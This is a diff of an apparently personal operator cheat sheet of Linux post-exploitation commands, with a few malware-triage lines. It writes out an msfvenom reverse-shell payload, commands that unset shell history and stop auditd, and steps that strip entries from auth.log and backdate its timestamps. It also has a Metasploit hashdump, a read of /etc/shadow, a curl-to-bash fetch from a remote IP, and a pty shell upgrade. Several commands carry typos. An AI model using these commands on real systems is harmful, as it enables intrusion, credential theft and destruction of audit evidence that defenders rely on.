@@ -3,95 +3,226 @@ Other pastables
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=443 -f elf > payload_elf
 
 ************* Malware Traige ************
-ps -elf				#What is the parent process?
-netstat -natup			# IS it network aware?
-lsof -Pnp <PID>			#lists open files, Shared Objects(Libraries), network connections for a process, is it logging to a file?
+X-----------------------------
+lsof -RPnp <PID>			#lists open files, Shared Objects(Libraries), network connections for a process, is it logging to a file?
+ps -eo pid,user,cmd,euid,egid,gid,uid   #lists process effective and acutal uid
+grep Sig /proc/<pid>/status             # what signals will the process trap
 stat </file>			#lists time stamps on a file, When was it writen to disk?
-ldd </file>			#displays shared objects
 echo $LD_PRELOAD		#look for odd preload files
 cat /proc/$PID/environ		#long list that shows PRELOAD files
 find / -newermt 2017-12-25 ! -newermt 2017-12-26	#search for additonal files based on time
-md5sum bad.file			#Hash the file
-scp user@ip:/path ./bad		#download file
-strings bad.file		#shows what the applicaiton is doing
-grep -r -i -H 127.0.0.1 /etc	#recusivly searches everything under /etc for 127.0.0.1, used to find persistanance
+grep -RiH 127.0.0.1 /etc	#recusivly searches everything under /etc for 127.0.0.1, used to find persistanance
+grep -RiH 127.0.0.1 /usr/lib/systemd
 cat /proc/modules		# lists loaded kernel modules
-cat /etc/crontab
-ls -al /etc/cron*
-crontab -l
-for user in $(cat /etc/passwd | egrep '/bin/sh|/bin/bash' | cut -d \: -f1); do "crontab -l -u $user"; done
-ls -lart /tmp
+find /etc/{init*,rc*} -type f -ls | grep "May 24"
+
+egrep -R <executable> /usr/lib/systemd/system
 cat /etc/rc.local
 ls -latr /proc/<pid>/fd
 
- 
+find / -type f -name ".*"
+fine / -type d -name ".*"
+-----------------------------X                                                                                                                                                                                     
+
 
 ************ Mando ***********
+X-----------------------------
 unset HISTFILE HISTFILESIZE HISTSIZE
-date
-df -h
-ps -elf
-netstat -natup
-ls -latr /var/log
-uname -a
-w
-cat /etc/*relese*
+su
+unset HISTFILE HISTFILESIZE HISTSIZE
+
+date; date +%s
 env
-/bin/bash -ic 'alias -p'
-ip a
-lastlog
-service --status-all || systemctl -t service --no-pager
-arp- vn
-route -n
-cat /etc/passwd
+PATH=$PATH:/sbin:/usr/sbin
+/bin/bash -ic 'alias -p'; alais ll='ls -latr'; alais pp="ps -ef | grep -v '\['"; alais nn='netstat -natup'                                                      
+
+w
+find /var/log -type f -mmin -10 x> /dev/null
+
+if [ -L /sbin/init }; then echo "===> Systemd"; elif [ -e /sbin/initctl ]; then echo "===> Upstart"; else echo "===> SysV"; fi
+
+service auditd status
+service auditd stop
+OR
+systemctl status auditd
+systemctl stop auditd
+
+lsof | grep txt | grep -v proc
+lsof -nP | grep TCP; nn
+ip a; netstat -rn
+hostname; uname -a; cat /etc/*relese*
+free -m; df -h
+
+systemctl -t service --no-pager || initctl list || service --status-all | grep "running"
+systemctl status
+OR
+chkconfig --list
+ls -l /etc/xinetd.d/
+
+for user in $(cat /etc/passwd | egrep '/bin/sh|/bin/bash' | cut -f1 -d:); do echo $user; crontab -u $user-l; done                                                                                                 
+ll /etc/cron*
+cat /etc/crontab
+
+for i in $(lsmod | cut -d ' ' -f1);do echo $i; modinfo $i | grep 'filename\|version:\|author'; ls -la $(modinfo $i | grep filename) 2> /dev/null; echo " "; done
+
+ls -lRitra /var/log
+last, lastlog
+ls /etc/*syslog*
+grep -v '#' /etc/*syslog*
+grep -v '#' /etc/rsyslog.d/*
+
+cat /etc/logrotate.rsyslod || cat /etc/logrotate.conf
+aureport
+cat -n /etc/audit/auditd.conf
+cat /etc/audit/audit.rules
+
+iptables -nvL --line-number
+iptables -t nat -nvL --line-number 
+cat /etc/systemd/journald.conf | grep Storage
+
 if [[ $(/sbin/getenforce 2>/dev/null) ]]; then eval /sbin/getenforce; else echo "No SELinux"; fi
 if [[ $(lsmod | grep -i table) ]]; then eval iptables -L; else echo "No IPTables"; fi
 
+cat /root/.bash_history /home/*/.bash_history
+ll /root /home/*
 
-************* Cleaning Logs ****************
-egrep -v "1.1.1.1" /var/log/secure > .new
-cat .new > /var/log/secure
-tail -1 /var/log/secure
-touch -r /var/log/lastlog /var/log/secure
-rm -f .new
+cat /etc/nsswitch.conf; cat /etc/hosts; cat /etc/resolv.conf
+cat /etc/passwd
+cat /etc/shadow
+cat /etc/group
+getent group sudo
+cat /etc/sudoers | grep -v "#"
+ll /tmp
+ll /etc
+ll /bin
+ll /sbin
+ll /usr/sbin
+ll /usr/bin
+
+ausearch -m AVC                                     #selinux logs
+aureport -u start today -i | grep <username>        #every event today assocaited with the user
+ausearch -m USER_LOGIN -ul root                     # info on root logins
+ausearch -x sudo -ua 100                            # effective or actual user id 100 using sudo.
+
+ls -latrH /var/www/*
+grep -RiH '.php' /var/www/
+-----------------------------X
+
+
+*************   PSP   ****************
+X-----------------------------
+1. Check for logfiles
+grep -i "scan" $(find /var/log -regex ".*\(log\|txt\)")
+
+2. check for config files
+grep -i "engine" $(find /etc/ -regex ".*\.\(log\|yml\|config\|conf\)")
+
+*****  CLAMAV  *****
+grep daily.cvd /var/log/clamav/freshclam.log
+grep Checks /etc/clamav/freshclam.conf
+check crontab for scheduled scans
+
+find /etc/clamav -regex ".*\.\(config\|yml\)"
+-----------------------------X
+
+
+*************   Cleaning Logs   ****************
+X-----------------------------
+date -d @<epoch time>               #converts epoch time to current date/time                                                                                                                                      
+
+tail -n 50 /var/log/auth.log
+cp /var/log/auth.log /tmp/.a
+grep -vE "sshd\[1000\]|13:21:29|su\[1053\]" /tmp.a > /tmp/.b
+cat /tmp/.b > /var/log/auth.log
+tail /var/log/auth.log
+touch -t 201904110941.10 /var/log/auth.log
+rm -f /tmp/.a
+rm -f /tmp/.b
 OR
-wc -l /var/log/auth.log
-head -[count -badlogs] /var/log/auth.log > .new
-touch -t yymmddhhmm /var/log/auth.log
-rm -f .new
+cat -n | tail -n 50 /var/log/auth.log
+head -[count -badlogs] /var/log/auth.log > /tmp/.b
+tail -[#of new logs] /var/log/auth.log >> /tmp/.b
+cat /tmp.b > /var/log/auth.log
+tail /var/log/auth.log
+touch -t yymmddhhmm.ss /var/log/auth.log
+rm -f /tmp/.b
+-----------------------------X                                                                                                                                                                                     
 
 
-************ Exit off Box ******************
-find / -type -f -mmin -60 2>/dev/null | -path /sys -prune -o -path /proc -prune -o -type d
-ps -elf
-netstat -natup
+************   Collect   ******************                                                                                                                                                                   
+X-----------------------------
+run post/linux/gather/hashdump
+
+find /{root,home} -regex ".*\.\(txt\|pdf\)"
+ll /etc/apache2/sites-enabled
+apt list --installed
+
+-----------------------------X
 
 
-*************** PING Sweep ***************
-for i in `seq 1 255`; do ping -c 1 192.168.1.$i | tr \\n ' ' | awk '/1 received/ {print $2}'; done
+************   Exit off Box   ******************
+X-----------------------------
+ls -latr /var/log /var/log/audit
+find /var/log -type f -mmin -60 2>/dev/null
+ls -latr /tmp
 
+pp
+nn
 
-*************** SSH Connections ****************
-ssh -M -f -N -o ControlPath=/tmp/ssh user@host
+service auditd start                                                                                                                                                                                               
+service auditd status
+OR
+systemctl start auditd
+systemctl status auditd
 
-ssh -S /tmp/ssh -O exit user@host
+-----------------------------X
 
+*************** Utilty Commands ***************
+X-----------------------------
+# Ping Sweep
+for i in `seq 1 254`; do ping -c1 -W1 192.168.1.$i | grep ttl; done; arp -a
 
-./survey.sh | ssh -v -x -M -S /tmp/@r user@1.1.1.1 > survey.out
-ssh -v -x -O forward -S /tmp/@r user@1.1.1.1 /bin/bash -i
-ssh -v -x -O forward -S /tmp/@r 127.0.0.1@fake -L80:2.2.2.2:80
-ssh -v -x -O forward -S /tmp/@r 127.0.0.1@fake -R 443:127.0.0.1:443
+# SSH Connection 
+ssh -v -M -S /tmp/T1.ssh -o "UserKnownHostsFile /dev/null" -o "StrictHostKeyChecking no" user@host
 
-kill -9 <pid of SSh Session>
+# SSH File Transfer
+cat localfile.txt | ssh user@<ip> " cat > file" 
 
-ssh -v -x -O cancel -S /tmp/@r 127.0.0.1@fake -R 443:127.0.0.1:443  #removes ssh tunnel
+# SSH NetCat Mode
+ssh -W root@<ip>
+
+# Run local script in SSH Session
+./survey.sh | ssh -S /tmp/T1.ssh user > survey.out
+
+# SSH for a single command 
+ssh -T user@1.1.1.1 cat /etc/passwd
+
+# SSH PTY without interactive session 
+ssh -t user@1.1.1.1 sudo vim /etc/passwd
+
+# Avoid Last Log/wtmp & who/utmp
+ssh -v -x -O forward -S /tmp/T1.ssh user@1.1.1.1 /bin/bash -i
+
+# Download Script to memory
+curl 10.10.20.151:8000/test | /bin/bash
+OR
+source /dev/stdin < <(curl 10.10.20.151:8000/test)
+
+#Upgrades a nc shell to tty
+python -c 'import pty;pty.spawn("/bin/bash")'   
+
+#generates a 12 charater random password
+openssl rand -base64 12 
+
+-----------------------------X
+
 
 *************** IPTables redirection ****************
-on Proxy:
+X-----------------------------
+
 sysctl net.ipv4.ip_forwrad=1
 iptables -t nat -A PREROUTING -src <sourceip> -p tcp -j DNAT --to-destination <targetip>
 iptables -t nat -A POSTROUTING -j MASQUERADE
 
+-----------------------------X                                                                                                                                                                                     
 
-*************** Other ****************
-curl | bash 		#load script from web to memory 
